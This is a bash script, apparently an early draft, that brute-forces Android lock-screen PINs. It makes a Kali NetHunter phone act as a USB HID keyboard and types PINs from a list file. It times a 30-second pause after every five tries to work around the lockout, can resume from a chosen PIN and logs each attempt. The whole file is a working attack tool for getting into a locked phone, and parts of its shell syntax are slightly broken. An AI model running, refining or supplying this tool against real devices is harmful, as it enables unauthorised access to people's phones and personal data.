#!/bin/bash
#
# works on Android 6.0.1
# 5 attempts, followed by 30 second timeout
# 
# test on extra popups like low battery

# doesn't help
# see if setprop sys.usb.config hid helps to bring them back, you can use setprop sys.usb.config reset to reset to boot up usb config
#
# https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-project/blob/05ecaee59c4937d588b44a52eec2a2dd576f5473/nethunter-installer/boot-patcher/ramdisk-patch/init.nethunter.rc

# select optimised pin list or X digit 
# progress bar!!!
#
# go in reverse
#
# COLOUR
#
# battery is low -- on screen. not receiving enter/keys. won't work.
#
# launch from nethunter?


LIGHT_RED="\e[91m"
LIGHT_GREEN="\e[92m"
DEFAULT="\e[39m"

function send_enter() {
  echo enter | $HID_KEYBOARD $KEYBOARD_DEVICE keyboard 2>/dev/null
  RET=$?
  sleep $DELAY_BETWEEN_KEYS
}

function send_key(){
  echo $1 | $HID_KEYBOARD $KEYBOARD_DEVICE keyboard 2>/dev/null
  RET=$?
  sleep $DELAY_BETWEEN_KEYS
}

# by default do not resume
RESUME_FROM_PIN=
LOG=bruter.log
DELAY_BETWEEN_KEYS=0.1
PIN_LIST=pinlist.txt
KEYBOARD_DEVICE=/dev/hidg0
HID_KEYBOARD=/system/xbin/hid-keyboard
COOLDOWN_TIME=30
COOLDOWN_AFTER_N_ATTEMPTS=5
VERSION=0.1
#RET=0

if [ -z "$1"]; then
  echo "Usage: $0 [RESUME_FROM_PIN]"
  echo -e "RESUME_FROM_PIN:\tResume brute-force from specified PIN"
  echo -e "start\tStart from the beginning of the PIN_LIST file"
  echo

fi

echo "Android PIN brute-force version $VERSION" | tee -a $LOG

# Show configuration

echo "[INFO] PIN list: $PIN_LIST" | tee -a $LOG
echo "[INFO] Delay between keystrokes: $DELAY_BETWEEN_KEYS" | tee -a $LOG
echo "[INFO] HID Keyboard device: $KEYBOARD_DEVICE" | tee -a $LOG
echo "[INFO] Log file: $LOG" | tee -a $LOG
if [ ! -z "$1" ]; then
  RESUME_FROM_PIN=$1
  echo "[CFG] Resuming from PIN $RESUME_FROM_PIN" | tee -a $LOG
fi

# Check Environment
echo "[INFO] Checking environment" | tee -a $LOG

if [ -e $KEYBOARD_DEVICE ]; then
  echo -e "[${LIGHT_GREEN}PASS${DEFAULT}] HID device ($KEYBOARD_DEVICE) found" | tee -a $LOG
else
  echo -e "[${LIGHT_RED}FAIL${DEFAULT}] HID device ($KEYBOARD_DEVICE) not found" | tee -a $LOG
  exit 1
fi

if [ -f $HID_KEYBOARD ]; then
  echo -e "[${LIGHT_GREEN}PASS${DEFAULT}] hid-keyboard executable ($HID_KEYBOARD) found" | tee -a $LOG
else
  echo -e "[${LIGHT_RED}FAIL${DEFAULT}] hid-keyboard executable ($HID_KEYBOARD) not found" | tee -a $LOG
  exit 1  
fi

count=0
for pin in `cat "$PIN_LIST" | grep -A 99999 "$RESUME_FROM_PIN"`
do
  ((count++))

  # hit enter twice before every PIN attempted
  send_enter
  send_enter

  # check connection to phone
  while [ $RET != 0 ]; do
    echo -e "[${LIGHT_RED}FAIL${DEFAULT}] HID USB device not ready. Return code from $HID_KEYBOARD was $RET."
    sleep 2
    send_enter
  done

  echo "[+] `date` $count: Trying $pin" | tee -a "$LOG"
  for i in `echo "$pin" | grep -o .`; do
    send_key $i
  done 
  send_enter

  # COOLDOWN_TIME is optional
  if [[ $COOLDOWN_TIME > 0 && $COOLDOWN_AFTER_N_ATTEMPTS > 0 ]]; then
    # if we are after N attempts
    if [ $((count % $COOLDOWN_AFTER_N_ATTEMPTS)) = 0 ]; then
      echo -n "[WAIT] "
      # countdown COOLDOWN_TIME seconds
      for (( countdown=$COOLDOWN_TIME; countdown > 0; countdown-- ))
      do
        if [ $(($countdown%5)) = 0 ]; then
          echo -n "."
          send_enter
        fi
        sleep 1
      done
      echo
    fi
  fi

done

#  pin=$(printf "%04s" $pin)



